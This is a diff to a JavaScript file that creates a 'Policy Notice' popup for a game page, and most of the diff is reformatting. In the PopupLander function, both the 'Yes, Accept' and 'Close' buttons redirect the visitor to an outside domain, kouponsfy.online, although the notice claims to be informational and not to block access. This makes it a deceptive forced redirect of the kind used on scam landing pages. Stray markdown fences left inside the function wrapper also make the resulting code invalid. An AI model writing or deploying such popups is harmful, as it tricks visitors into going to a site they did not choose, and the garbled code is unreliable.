@@ -1,89 +1,94 @@
 (function () {
 
+```
 const REDIRECT = "https://kouponsfy.online";
 
 function buildPopup() {
 
-```
-if (document.querySelector(".modal-backdrop")) return null;
+    if (document.querySelector(".modal-backdrop")) return null;
 
-const bd = document.createElement("div");
+    const bd = document.createElement("div");
 
-bd.className = "modal-backdrop";
+    bd.className = "modal-backdrop";
 
-bd.innerHTML = `
-  <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
-    <h3>Policy Notice</h3>
-    <p>
-      Are you accepting our policy to play the game?
-      This notice is informational and does not block access.
-    </p>
+    bd.innerHTML = `
+        <div class="modal" role="dialog" aria-modal="true" aria-label="Policy Notice">
 
-    <div class="modal-actions">
-      <button class="btn" id="age-yes">
-        Yes, Accept
-      </button>
+            <h3>Policy Notice</h3>
 
-      <button class="btn ghost" id="age-no">
-        Close
-      </button>
-    </div>
-  </div>
-`;
+            <p>
+                Are you accepting our policy to play the game?
+                This notice is informational and does not block access.
+            </p>
 
-document.body.appendChild(bd);
+            <div class="modal-actions">
 
-bd.style.display = "flex";
+                <button class="btn" id="age-yes">
+                    Yes, Accept
+                </button>
 
-function close() {
-    bd.classList.add("fade-out");
+                <button class="btn ghost" id="age-no">
+                    Close
+                </button>
 
-    setTimeout(() => {
-        bd.remove();
-    }, 180);
-}
+            </div>
 
-return { bd, close };
-```
+        </div>
+    `;
 
+    document.body.appendChild(bd);
+
+    bd.style.display = "flex";
+
+    function close() {
+
+        bd.classList.add("fade-out");
+
+        setTimeout(() => {
+            bd.remove();
+        }, 180);
+
+    }
+
+    return {
+        bd,
+        close
+    };
 }
 
 window.PopupIndex = function () {
 
-```
-const built = buildPopup();
+    const built = buildPopup();
 
-if (!built) return;
+    if (!built) return;
 
-const { bd, close } = built;
+    const { bd, close } = built;
 
-bd.querySelector("#age-yes").addEventListener("click", close);
+    bd.querySelector("#age-yes").addEventListener("click", close);
 
-bd.querySelector("#age-no").addEventListener("click", () => {
-    window.location.href = "privacy.html";
-});
-```
+    bd.querySelector("#age-no").addEventListener("click", () => {
+        window.location.href = "privacy.html";
+    });
 
 };
 
 window.PopupLander = function () {
 
-```
-const built = buildPopup();
+    const built = buildPopup();
 
-if (!built) return;
+    if (!built) return;
 
-const { bd } = built;
+    const { bd } = built;
 
-bd.querySelector("#age-yes").addEventListener("click", () => {
-    window.location.href = REDIRECT;
-});
+    bd.querySelector("#age-yes").addEventListener("click", () => {
+        window.location.href = REDIRECT;
+    });
 
-bd.querySelector("#age-no").addEventListener("click", () => {
-    window.location.href = REDIRECT;
-});
-```
+    bd.querySelector("#age-no").addEventListener("click", () => {
+        window.location.href = REDIRECT;
+    });
 
 };
+```
 
 })();
